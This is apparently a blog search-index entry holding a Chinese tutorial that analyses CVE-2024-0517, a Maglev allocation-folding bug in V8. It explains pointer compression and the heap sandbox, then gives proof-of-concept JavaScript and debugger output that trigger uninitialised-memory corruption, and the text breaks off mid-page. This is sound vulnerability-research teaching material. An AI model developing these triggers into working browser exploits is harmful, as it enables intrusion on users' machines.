<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>V8-pwn入门(4)——CVE-2024-0517分析</title>
      <link href="/2025/05/28/V8-pwn%E5%85%A5%E9%97%A8-4-%E2%80%94%E2%80%94CVE-2024-0517%E5%88%86%E6%9E%90/"/>
      <url>/2025/05/28/V8-pwn%E5%85%A5%E9%97%A8-4-%E2%80%94%E2%80%94CVE-2024-0517%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-环境配置"><a href="#0x00-环境配置" class="headerlink" title="0x00 环境配置"></a>0x00 环境配置</h2><p>构建对应版本的V8</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> v8</span><br><span class="line">git checkout e73f620c2ef1230ddaa61551706225821a87c3b9</span><br><span class="line">gclient <span class="built_in">sync</span> -D</span><br><span class="line"></span><br><span class="line"><span class="comment"># build V8</span></span><br><span class="line">./build/install-build-deps.sh</span><br><span class="line">gn gen out/debug --args=<span class="string">&#x27;v8_no_inline=true v8_optimized_debug=false is_component_build=false v8_expose_memory_corruption_api=true&#x27;</span></span><br><span class="line">ninja -C out/debug d8</span><br><span class="line">./tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure></div><h2 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h2><h3 id="Pointer-Compression"><a href="#Pointer-Compression" class="headerlink" title="Pointer Compression"></a>Pointer Compression</h3><p>💡V8在chrome80以后引入指针压缩机制，简单来说是把原本64位的地址分为高32位的base和低32位的offset，base由全局变量存储，内存中只需要存储offset，因此查看内存分布用w单位</p><p>压缩前的指针</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">            |----- 32 bits -----|----- 32 bits -----|</span><br><span class="line">Pointer:    |________base_______|______offset_____w1|</span><br></pre></td></tr></table></figure></div><p>压缩后</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">                    |----- 32 bits -----|----- 32 bits -----|</span><br><span class="line">Compressed pointer:                     |______offset_____w1|</span><br><span class="line">Compressed Smi:                         |____int31_value___0|</span><br></pre></td></tr></table></figure></div><p>在指针压缩的背景下，我们再来解读内存分布，下面列出的32bits的都是压缩后的offset或32位的smi，需要注意的是smi存储时相当于把原始值左移一位，并且最低位由0填充</p><p>可以看到依次存储着Map*、elements、properties、以及各属性的值（1，2，3，4）</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/16wx <span class="number">0x3aef001c94ad</span>-<span class="number">1</span></span><br><span class="line"><span class="number">0x3aef001c94ac</span>:<span class="number">0x000d9f4d</span>(<span class="title class_">Map</span>*)<span class="number">0x000006cd</span>(elements)<span class="number">0x000006cd</span>(properties)<span class="number">0x00000002</span>(<span class="number">1</span>的smi)</span><br><span class="line"><span class="number">0x3aef001c94bc</span>:<span class="number">0x00000004</span>(<span class="number">2</span>的smi)<span class="number">0x00000006</span>(<span class="number">3</span>的smi)<span class="number">0x00000008</span>(<span class="number">4</span>的smi)<span class="number">0x0000062d</span></span><br><span class="line"><span class="number">0x3aef001c94cc</span>:<span class="number">0x00010001</span><span class="number">0x00000000</span><span class="number">0x000006f5</span><span class="number">0x00002a21</span></span><br><span class="line"><span class="number">0x3aef001c94dc</span>:<span class="number">0x00000084</span><span class="number">0x00000002</span><span class="number">0x0000062d</span><span class="number">0x00020002</span></span><br></pre></td></tr></table></figure></div><p>由于压缩完的指针只有32位，因此被放在4GB大小的Pointer Compression Cage中</p><h3 id="Allocation-Folding"><a href="#Allocation-Folding" class="headerlink" title="Allocation Folding"></a>Allocation Folding</h3><p>Allocation Folding将多个临近的对象分配操作合并为一次内存分配，以减少内存碎片和提升执行性能，这一块由Maglev负责，Maglev是一个中速JIT（介于Sparkplug和TurboFan之间）。针对下面例子，假设<code>Instance</code>和<code>Array a</code>分别需要12和88字节，那么Maglev就会将两个内存分配折叠成一个100字节的分配，并将<code>Array a</code>放在<code>FirstAllocate_addr+12</code>上，因为<code>Instance</code>需要12字节。</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/image-20250528155240036.png"                      alt="image-20250528155240036" style="zoom:50%;"                 ><figcaption>image-20250528155240036</figcaption></figure><p>也可以用下面的具体例子</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">1.1</span>];</span><br><span class="line">    %<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%<span class="title class_">PrepareFunctionForOptimization</span>(f);<span class="comment">//预处理以供v8优化，主要是收集一些运行时信息</span></span><br><span class="line"><span class="title function_">f</span>();</span><br><span class="line">%<span class="title class_">OptimizeMaglevOnNextCall</span>(f);<span class="comment">//下一次调用f函数时使用Maglev优化</span></span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure></div><p>执行以观察maglev graph的构建过程</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./d8 --allow-natives-syntax --shell --trace-maglev-graph-building poc1.js</span></span><br><span class="line">...</span><br><span class="line">== New block (merge) at 0x1c2b000db2ad &lt;SharedFunctionInfo f&gt;==</span><br><span class="line">  0x55d3ffa732a8  n7: AllocateRaw(Young, 16) → (x), 0 uses # 🌟在新生代分配了16大小的内存，用来存FixedDoubleArray</span><br><span class="line">  ! Clearing unstable node aspects # 上面的分配被标记为不稳定，后续可能会优化</span><br><span class="line">  0x55d3ffa73318  n8: StoreMap(0x1c2b00000851 &lt;Map(FIXED_DOUBLE_ARRAY_TYPE)&gt;) [n7:(x)]</span><br><span class="line">  0x55d3ffa73400  n10: StoreTaggedFieldNoWriteBarrier(0x4) [n7:(x), n9:(x)]</span><br><span class="line">  ! Clearing unstable node aspects</span><br><span class="line">  0x55d3ffa734d8  n12: StoreFloat64(0x8) [n7:(x), n11:(x)]</span><br><span class="line">  0x55d3ffa73510  n13: FoldedAllocation(+16) [n7:(x)] → (x), 0 uses # 🌟优化的地方，折叠分配，在前面16字节的基础上，接着分配空间给JSArray</span><br><span class="line">  ! Clearing unstable node aspects</span><br><span class="line">  0x55d3ffa73580  n14: StoreMap(0x1c2b000cefc1 &lt;Map[16](PACKED_DOUBLE_ELEMENTS)&gt;) [n13:(x)]</span><br><span class="line">  0x55d3ffa736c0  n16: StoreTaggedFieldNoWriteBarrier(0x4) [n13:(x), n15:(x)]</span><br><span class="line">  0x55d3ffa73718  n17: StoreTaggedFieldNoWriteBarrier(0xc) [n13:(x), n9:(x)]</span><br><span class="line">  0x55d3ffa73770  n18: StoreTaggedFieldNoWriteBarrier(0x8) [n13:(x), n7:(x)]</span><br><span class="line">   4 : c6                Star0</span><br><span class="line">   5 : 65 af 01 f9 01    CallRuntime [DebugPrint], r0-r0</span><br><span class="line">  ! Clearing unstable node aspects</span><br><span class="line">  0x55d3ffa73850  n19: CallRuntime(DebugPrint) [n3:(x), n13:(x)] → (x), 0 uses</span><br><span class="line">  10 : 0e                LdaUndefined</span><br><span class="line">  11 : ab                Return</span><br><span class="line">  0x55d3ffa738f8  n20: ReduceInterruptBudgetForReturn(11)</span><br><span class="line">  0x55d3ffa73930  n21: Return [n4:(x)]</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div><p>而当我们查看最终得到的包含IR的maglev graph时，会发现maglev将<code>AllocateRaw(16) + FoldedAllocation(+16)</code>合并成<code>AllocateRaw(32)</code></p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./d8 --allow-natives-syntax --print-maglev-graph poc1.js</span></span><br><span class="line">...</span><br><span class="line">After register allocation</span><br><span class="line">Graph</span><br><span class="line"></span><br><span class="line">    1/3: Constant(0x1f6b000c3c89 &lt;NativeContext[285]&gt;) → v-1, live range: [1-19]</span><br><span class="line">    2/2: Constant(0x1f6b000db355 &lt;JSFunction f (sfi = 0x1f6b000db2ad)&gt;) → v-1, live range: [2-19]</span><br><span class="line">    3/4: RootConstant(undefined_value) → v-1, live range: [3-21]</span><br><span class="line">   4/15: RootConstant(empty_fixed_array) → v-1, live range: [4-16]</span><br><span class="line">    5/9: SmiConstant(1) → v-1, live range: [5-17]</span><br><span class="line">   6/11: Float64Constant(1.1) → v-1, live range: [6-13]</span><br><span class="line"> Block b1</span><br><span class="line">0x1f6b000db2ad &lt;SharedFunctionInfo f&gt; (0x1f6b001c9b89 &lt;String[7]: &quot;poc1.js&quot;&gt;)</span><br><span class="line">   0 : CreateArrayLiteral [0], [0], #37</span><br><span class="line">    7/1: InitialValue(&lt;this&gt;) → [stack:-6|t], live range: [7-19]</span><br><span class="line">    8/5: FunctionEntryStackCheck</span><br><span class="line">         ↳ lazy @-1 (2 live vars)</span><br><span class="line">    9/6: Jump b2</span><br><span class="line">      ↓</span><br><span class="line"> Block b2</span><br><span class="line">   10/7: AllocateRaw(Young, 32) → [rdi|R|t], live range: [10-18] # 🌟一次性分配32字节</span><br><span class="line">   11/8: StoreMap(0x1f6b00000851 &lt;Map(FIXED_DOUBLE_ARRAY_TYPE)&gt;) [v10/n7:[rdi|R|t]]</span><br><span class="line">     22: ConstantGapMove(v5/n9 → [rax|R|t])</span><br><span class="line">  12/10: StoreTaggedFieldNoWriteBarrier(0x4) [v10/n7:[rdi|R|t], v5/n9:[rax|R|t]]</span><br><span class="line">     23: ConstantGapMove(v6/n11 → [xmm0|R|f64])</span><br><span class="line">  13/12: StoreFloat64(0x8) [v10/n7:[rdi|R|t], v6/n11:[xmm0|R|f64]]</span><br><span class="line">  14/13: FoldedAllocation(+16) [v10/n7:[rdi|R|t]] → [rcx|R|t], live range: [14-19]</span><br><span class="line">     24: GapMove([rdi|R|t] → [rdx|R|t])</span><br><span class="line">     25: GapMove([rcx|R|t] → [rdi|R|t])</span><br><span class="line">  15/14: StoreMap(0x1f6b000cefc1 &lt;Map[16](PACKED_DOUBLE_ELEMENTS)&gt;) [v14/n13:[rdi|R|t]]</span><br><span class="line">     26: ConstantGapMove(v4/n15 → [rbx|R|t])</span><br><span class="line">  16/16: StoreTaggedFieldNoWriteBarrier(0x4) [v14/n13:[rcx|R|t], v4/n15:[rbx|R|t]]</span><br><span class="line">  17/17: StoreTaggedFieldNoWriteBarrier(0xc) [v14/n13:[rcx|R|t], v5/n9:[rax|R|t]]</span><br><span class="line">  18/18: StoreTaggedFieldNoWriteBarrier(0x8) [v14/n13:[rcx|R|t], v10/n7:[rdx|R|t]]</span><br><span class="line">     27: ConstantGapMove(v1/n3 → [rsi|R|t])</span><br><span class="line">   5 : CallRuntime [DebugPrint], r0-r0</span><br><span class="line">  19/19: 🐢 CallRuntime(DebugPrint) [v1/n3:[rsi|R|t], v14/n13:[rcx|R|t]] → [rax|R|t]</span><br><span class="line">         ↳ lazy @5 (2 live vars)</span><br><span class="line">  11 : Return</span><br><span class="line">  20/20: ReduceInterruptBudgetForReturn(11)</span><br><span class="line">     28: ConstantGapMove(v3/n4 → [rax|R|t])</span><br><span class="line">  21/21: Return [v3/n4:[rax|R|t]]</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div><p>也可以调试验证一下前面分配的16字节，修改文件</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">1.1</span>];</span><br><span class="line">    %<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%<span class="title class_">PrepareFunctionForOptimization</span>(f);</span><br><span class="line"><span class="title function_">f</span>();</span><br><span class="line">%<span class="title class_">OptimizeMaglevOnNextCall</span>(f);</span><br><span class="line"><span class="title function_">f</span>();</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure></div><p>gdb运行</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gdb --args ./d8 --allow-natives-syntax poc1.js</span></span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">优化后的JSArray</span></span><br><span class="line">DebugPrint: 0xd91001ca949: [JSArray]</span><br><span class="line"> - map: 0x0d91000cefc1 &lt;Map[16](PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x0d91000ce935 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x0d91001ca939 &lt;FixedDoubleArray[1]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 1</span><br><span class="line"> - properties: 0x0d91000006cd &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0xd9100000d41: [String] in ReadOnlySpace: #length: 0x0d910030ec35 &lt;AccessorInfo name= 0x0d9100000d41 &lt;String[6]: #length&gt;, data= 0x0d9100000061 &lt;undefined&gt;&gt; (const accessor descriptor), location: descriptor</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x0d91001ca939 &lt;FixedDoubleArray[1]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line"> &#125;</span><br><span class="line"> 0xd91000cefc1: [Map] in OldSpace</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div><p>跟进看看内存布局，注意此时是在指针压缩背景下，指针都是32位</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/16wx 0xd91001ca949-1</span></span><br><span class="line">0xd91001ca948:0x000cefc1(Map*)0x000006cd(Properties*)0x001ca939(elements*)0x00000002(数组长度，1的smi)</span><br><span class="line">0xd91001ca958:0xbeadbeef0xbeadbeef0xbeadbeef0xbeadbeef</span><br><span class="line">0xd91001ca968:0xbeadbeef0xbeadbeef0xbeadbeef0xbeadbeef</span><br><span class="line">0xd91001ca978:0xbeadbeef0xbeadbeef0xbeadbeef0xbeadbeef</span><br></pre></td></tr></table></figure></div><p>根据JSArray的对象模型，这个elements*就指向一个FixedArray，可以看到这个地址刚好和JSArray差16字节，是一个FixedDoubleArray（用来存Array中的具体元素），对应了maglev一开始在新生代分配了16大小的内存</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/16wx 0xd91001ca939-1</span></span><br><span class="line">0xd91001ca938:0x00000851(Map*)0x00000002(数组长度，1的smi)0x9999999a0x3ff19999 (8字节一起表示1.1这个double值)</span><br><span class="line">0xd91001ca948:0x000cefc10x000006cd0x001ca9390x00000002</span><br><span class="line">0xd91001ca958:0xbeadbeef0xbeadbeef0xbeadbeef0xbeadbeef</span><br><span class="line">0xd91001ca968:0xbeadbeef0xbeadbeef0xbeadbeef0xbeadbeef</span><br></pre></td></tr></table></figure></div><h3 id="UberCage"><a href="#UberCage" class="headerlink" title="UberCage"></a>UberCage</h3><p>UberCage是V8的sandbox，V8在启动时，会保留一段地址空间区域(1TB)作为V8的sandbox，这种隔离有两种实现方式</p><ul><li><p>如果buffer位于sandbox内，就将40位的地址偏移左移24位后得到的64位结果写入相应字段地址中</p></li><li><p>如果buffer位于sandbox外，则会将指定字段地址内的值作为索引，通过指针表(Pointer Tables)间接的引用buffer</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/image-20250528163722162.png"                      alt="image-20250528163722162" style="zoom:50%;"                 ><figcaption>image-20250528163722162</figcaption></figure></li></ul><p>总体上V8的heap sandbox可以总结为下图</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/image-20250528165937825.png"                      alt="image-20250528165937825" style="zoom:50%;"                 ><figcaption>image-20250528165937825</figcaption></figure><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>V8 在优化派生类（class A extends B）的构造函数时，会用<code>TryBuildFindNonDefaultConstructorOrConstruct()</code>沿着原型链向上找构造函数。</p><p>具体来说，V8会：</p><ul><li>遍历原型链以找到合适的构造函数，同时还需要执行对应的类型检查（比如验证Map，即Hidden Class），以避免类型混淆</li><li>如果类型检查都通过，V8就会用<code>BuildAllocateFastObject()</code>分配内存来创建对象，这个函数内部会调用<code>ExtendOrReallocateCurrentRawAllocation()</code>，该函数用于决定是新分配一块内存，还是扩展之前的分配。</li><li>分配折叠：<code>ExtendOrReallocateCurrentRawAllocation()</code>会根据之前最近一次分配是否可以和当前分配“折叠”来决定如何分配内存。如果分配大小超过一定阈值，就会进行新的分配；否则就折叠进现有分配中，从而减少内存碎片和提升性能。</li></ul><p>而漏洞点在于：调用 super()（即调用父类构造函数）后，某些关键内存没有被正确初始化。如果此时又立即创建了另一个对象，而这段尚未初始化的内存被重用，就可能出现OOB</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>先看一个简单的分配折叠例子</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x;</span><br><span class="line"><span class="keyword">let</span> a;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123; &#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_ inherited__">A</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        x = <span class="keyword">new</span>.<span class="property">target</span>; <span class="comment">//将正在构造的类的引用赋值给x</span></span><br><span class="line">        <span class="variable language_">super</span>();</span><br><span class="line">        a = [<span class="number">1.1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">% <span class="title class_">PrepareFunctionForOptimization</span>(B);</span><br><span class="line"><span class="keyword">new</span> <span class="title function_">B</span>();</span><br><span class="line">% <span class="title class_">OptimizeMaglevOnNextCall</span>(B);</span><br><span class="line"><span class="keyword">let</span> b = <span class="keyword">new</span> <span class="title function_">B</span>();</span><br></pre></td></tr></table></figure></div><blockquote><p>B继承自A</p></blockquote><p>查看优化过程</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ./out/debug/d8 --allow-natives-syntax --trace-maglev-graph-building poc3.js | grep Allocate</span><br><span class="line">  0x558b7953c3e8  n11: AllocateRaw(Young, 12) → (x), 0 uses</span><br><span class="line">$ ./out/debug/d8 --allow-natives-syntax --trace-maglev-graph-building poc3.js | grep Folded</span><br><span class="line">  0x56273f7aa288  n17: FoldedAllocation(+12) [n11:(x)] → (x), 0 uses</span><br><span class="line">  0x56273f7aa4f0  n23: FoldedAllocation(+28) [n11:(x)] → (x), 0 uses</span><br><span class="line">  * Recording context slot store n28[16]: FoldedAllocation(+28) [n11:(x)] → (x), 6 uses</span><br></pre></td></tr></table></figure></div><blockquote><p>第一个12对应了b这个B类的实例，+12和+28分别对应a这个JSArray和它的element(FixedArray),因此a一共占了32字节，最终一起分配12+32&#x3D;44字节</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">d8 --allow-natives-syntax --print-maglev-graph poc3.js | grep Allocate</span></span><br><span class="line">  12/11: AllocateRaw(Young, 44) → [rdi|R|t] (spilled: [stack:1|t]), live range: [12-31]</span><br></pre></td></tr></table></figure></div></blockquote><p>之后进行一点修改，将数组赋值改成触发gc，并打印b的信息</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x;</span><br><span class="line"><span class="keyword">let</span> a;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123; &#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_ inherited__">A</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        x = <span class="keyword">new</span>.<span class="property">target</span>; <span class="comment">//将正在构造的类的引用赋值给x</span></span><br><span class="line">        <span class="variable language_">super</span>();</span><br><span class="line">        <span class="title function_">gc</span>();</span><br><span class="line">        <span class="comment">//a = [1.1];</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">% <span class="title class_">PrepareFunctionForOptimization</span>(B);</span><br><span class="line"><span class="keyword">new</span> <span class="title function_">B</span>();</span><br><span class="line">% <span class="title class_">OptimizeMaglevOnNextCall</span>(B);</span><br><span class="line"><span class="keyword">let</span> b = <span class="keyword">new</span> <span class="title function_">B</span>();</span><br><span class="line">%<span class="title class_">DebugPrint</span>(b);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure></div><p>进行调试</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gdb --args out/x64.release/d8 --allow-natives-syntax --expose-gc poc4.js</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/20wx 0x36eb002c2219-1</span></span><br><span class="line">0x36eb002c2218:0x0019afe5(Map*)0x000006cd(Properties*)0x000006cd(elements*)0x00000919</span><br><span class="line">0x36eb002c2228:0x0007bbb80x000000000x000000000x00000000</span><br><span class="line">0x36eb002c2238:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x36eb002c2248:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x36eb002c2258:0x000000000x000000000x000000000x00000000</span><br></pre></td></tr></table></figure></div><blockquote><p>从0x00000919 开始是还未初始化的内存</p></blockquote><h4 id="Allocation-after-garbage-collection"><a href="#Allocation-after-garbage-collection" class="headerlink" title="Allocation after garbage collection"></a>Allocation after garbage collection</h4><p>将数组赋值加回去，同时使用空的eval语句从FreeSpace中分配内存</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123; &#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_ inherited__">A</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        x = <span class="keyword">new</span>.<span class="property">target</span>;</span><br><span class="line">        <span class="variable language_">super</span>();</span><br><span class="line">        <span class="title function_">gc</span>();</span><br><span class="line">        <span class="keyword">let</span> a = [<span class="number">1.1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">% <span class="title class_">PrepareFunctionForOptimization</span>(B);</span><br><span class="line"><span class="keyword">new</span> <span class="title function_">B</span>();</span><br><span class="line">% <span class="title class_">OptimizeMaglevOnNextCall</span>(B);</span><br><span class="line"><span class="keyword">new</span> <span class="title function_">B</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;&#x27;</span>); <span class="comment">// allocate from FreeSpace</span></span><br></pre></td></tr></table></figure></div><p>此时运行就会触发Fatal error，错误发生在<code>FreeSpace::IsValid()</code>函数中。问题出现在<code>free-space-inl.h</code>文件中的一个检查未通过，该检查条件为：</p><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!heap-&gt;<span class="built_in">deserialization_complete</span>() || <span class="built_in">map_slot</span>().<span class="built_in">contains_map_value</span>(free_space_map.<span class="built_in">ptr</span>())</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/image-20250528192652872.png"                      alt="image-20250528192652872"                